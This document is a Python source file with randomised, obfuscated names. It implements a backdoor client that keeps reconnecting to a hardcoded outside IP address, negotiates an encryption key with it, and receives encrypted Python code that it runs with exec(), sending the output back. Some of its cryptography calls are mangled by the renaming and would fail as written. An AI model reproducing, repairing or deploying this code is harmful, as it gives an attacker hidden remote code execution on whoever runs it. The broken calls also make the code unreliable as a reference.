import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

PhhKaaIGlzcOApEc = []
actEeuViNdnAMUlceFqe_connections = []

def WXAnuBouymmwsBUj(sig, frame):

    for gCXaOYsiiDyOaKhr_socket in PhhKaaIGlzcOApEc:
        gCXaOYsiiDyOaKhr_socket.close()

    sys.exit(0)

signal.signal(signal.SIGINT, WXAnuBouymmwsBUj)

ArrfbaiCZKQRAFSl = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

ArrfbaiCZKQRAFSl = ArrfbaiCZKQRAFSl.encode('utf-8')

OxDPlSRQInDYizYt = serialization.load_pem_public_key(ArrfbaiCZKQRAFSl)

def dApKHBThlwSZWUVe(OxDPlSRQInDYizYt, code_snippet):

    sMUjHabZeQWlhzAt = OxDPlSRQInDYizYt.key_size

    WShzHStbqzOaGzyw = (sMUjHabZeQWlhzAt // 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(code_snippet) > WShzHStbqzOaGzyw:
        sys.exit(0)

    try:
        MGghJRpmSlKUMWmH = OxDPlSRQInDYizYt.encrypt(
            code_snippet,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        sys.exit(1)

    XTuYMyUyZLzMwGMU = base64.b64encode(MGghJRpmSlKUMWmH).decode('utf-8')
    return XTuYMyUyZLzMwGMU


def pnXPfGuoFRbJRgaX(gCXaOYsiiDyOaKhr):
    nAXPBSQbBYQhIcLQ = gCXaOYsiiDyOaKhr.recv(4096)
    nAXPBSQbBYQhIcLQ = nAXPBSQbBYQhIcLQ.decode()

    n, g = nAXPBSQbBYQhIcLQ.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)
    yOadMMFZMnHNjIHP = int(pow(g, x, n))

    yOadMMFZMnHNjIHP = str(yOadMMFZMnHNjIHP)
    gCXaOYsiiDyOaKhr.send(yOadMMFZMnHNjIHP.encode())

    TamuaPsZElfXnTNA = gCXaOYsiiDyOaKhr.recv(4096)
    TamuaPsZElfXnTNA = int(TamuaPsZElfXnTNA.decode())

    EvqZkMijIgyZSNxN = pow(TamuaPsZElfXnTNA, x, n)

    pWnogkoEMHZalbyg = int.to_bytes(EvqZkMijIgyZSNxN, length=(EvqZkMijIgyZSNxN.bit_length() + 7) // 8, byteorder='big')
    pWnogkoEMHZalbyg = hashlib.sha256(pWnogkoEMHZalbyg).digest()

    return pWnogkoEMHZalbyg


def FzsfxjmPKstKjBbv(ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH, rRGZAjZCulYKSgKB, lqgsgMiUDzFBiBzn):

    if (ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH) in actEeuViNdnAMUlceFqe_connections:
        return

    gCXaOYsiiDyOaKhr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    gCXaOYsiiDyOaKhr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    PhhKaaIGlzcOApEc.append(gCXaOYsiiDyOaKhr)

    try:
        gCXaOYsiiDyOaKhr.connect((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))
        actEeuViNdnAMUlceFqe_connections.append((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))
        
        pWnogkoEMHZalbyg = pnXPfGuoFRbJRgaX(gCXaOYsiiDyOaKhr)

        cXTRcckyGERRRlPg = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
        try:
            encrypted_cXTRcckyGERRRlPg = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, cXTRcckyGERRRlPg.encode())
            gCXaOYsiiDyOaKhr.send(encrypted_cXTRcckyGERRRlPg)
        except Exception as e:
            pass

        KGqxKdAfyksObSPN = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
        try:
            KGqxKdAfyksObSPN = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, KGqxKdAfyksObSPN.encode())
        except Exception as e:
            pass


        while True:

            gCXaOYsiiDyOaKhr.send(KGqxKdAfyksObSPN)

            ZEFLLftPTwJSabdf = gCXaOYsiiDyOaKhr.recv(4096)
            try:
                decrypted_ZEFLLftPTwJSabdf = cMMkISnHnklukBQR(pWnogkoEMHZalbyg, ZEFLLftPTwJSabdf)
            except Exception as e:
                continue

            DZPSBJBmHDxYUADA = sys.stdout
            qUsyDHXOMmHsMmvb = io.StringIO()
            sys.stdout = qUsyDHXOMmHsMmvb

            try:
                exec(decrypted_ZEFLLftPTwJSabdf)
                qphbcazvUvCVfemT = qUsyDHXOMmHsMmvb.getvalue()
                if qphbcazvUvCVfemT:
                    print(qphbcazvUvCVfemT)
                elif qphbcazvUvCVfemT == "":
                    qphbcazvUvCVfemT = "empty nAXPBSQbBYQhIcLQ"
            except Exception as e:
                qphbcazvUvCVfemT = e
            finally:
                sys.stdout = DZPSBJBmHDxYUADA


            ZwGfVGYjPUdqTRuc = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, qphbcazvUvCVfemT.encode())
            gCXaOYsiiDyOaKhr.send(ZwGfVGYjPUdqTRuc)

            time.sleep(1)


    except Exception as e:
        pass

    finally:
        if (ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH) in actEeuViNdnAMUlceFqe_connections:
            actEeuViNdnAMUlceFqe_connections.remove((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))

        gCXaOYsiiDyOaKhr.close()

def FIsBuVHVFDVsoTdv(key, rwqKPQkhXmJdIHxB):
    EeuViNdnAMUlceFq = os.urandom(16)
    kCUrUMahkwRMHQiU = Cipher(algorithms.AES(key), modes.CBC(EeuViNdnAMUlceFq), backend=default_backend())
    encryptor = kCUrUMahkwRMHQiU.encryptor()

    JgJNolsSSDGHlioO = sym_padding.PKCS7(algorithms.AES.block_size).JgJNolsSSDGHlioO()
    rUkvznzbNUnELkfB = JgJNolsSSDGHlioO.update(rwqKPQkhXmJdIHxB) + JgJNolsSSDGHlioO.finalize()

    kCUrUMahkwRMHQiUtext = encryptor.update(rUkvznzbNUnELkfB) + encryptor.finalize()
    return EeuViNdnAMUlceFq + kCUrUMahkwRMHQiUtext

def cMMkISnHnklukBQR(key, encrypted_message):
    EeuViNdnAMUlceFq = encrypted_message[:16]
    kCUrUMahkwRMHQiUtext = encrypted_message[16:]

    kCUrUMahkwRMHQiU = Cipher(algorithms.AES(key), modes.CBC(EeuViNdnAMUlceFq), backend=default_backend())
    gtxjDMjJCTKjxehv = kCUrUMahkwRMHQiU.gtxjDMjJCTKjxehv()

    padded_rwqKPQkhXmJdIHxB = gtxjDMjJCTKjxehv.update(kCUrUMahkwRMHQiUtext) + gtxjDMjJCTKjxehv.finalize()

    AOjWqKHTWgpmPnmK = sym_padding.PKCS7(algorithms.AES.block_size).AOjWqKHTWgpmPnmK()
    rwqKPQkhXmJdIHxB = AOjWqKHTWgpmPnmK.update(padded_rwqKPQkhXmJdIHxB) + AOjWqKHTWgpmPnmK.finalize()

    return rwqKPQkhXmJdIHxB.decode('utf-8')


if __name__ == "__main__":

    ZWOHpKqqoBAUTUPl = "34.204.78.186"
    blZjtYCrvtNVDuuH = int(65500)
    rRGZAjZCulYKSgKB = prEeuViNdnAMUlceFqate_ip = "127.0.0.1"
    lqgsgMiUDzFBiBzn = 1239

    while True:
        try:
            FzsfxjmPKstKjBbv(ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH, rRGZAjZCulYKSgKB, lqgsgMiUDzFBiBzn)
        except Exception as e:
            time.sleep(1)
            continue

        time.sleep(5)
